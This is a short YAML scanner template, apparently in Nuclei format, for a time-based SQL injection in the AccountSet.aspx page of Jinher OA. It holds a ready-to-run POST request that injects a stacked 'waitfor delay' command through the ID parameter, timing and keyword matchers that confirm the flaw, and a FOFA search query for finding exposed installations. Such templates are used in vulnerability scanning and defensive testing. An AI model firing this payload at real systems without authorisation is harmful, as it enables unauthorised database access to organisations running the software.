id: poc-yaml-jinher-jhsoft-accountset-aspx-sqli
info:
  name: Jinher OA AccountSet.aspx SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: Jinher OA
    fofa: app="金和网络-金和OA"

variables:
  t1: "{{rand_int(5, 10)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - raw:
      - |
        POST /c6/JHSoft.Web.CostControl/subClass/AccountSet.aspx/?ID=1;waitfor+delay%270:0:{{t1}}%27--&OperType=Edit HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "帐套设置"
          - "系统编码"
          - "帐套状态"
      - type: dsl
        dsl:
          - "status_code == 200"
          - "duration >= to_number(t1)"
          - "duration <= to_number(t2)"
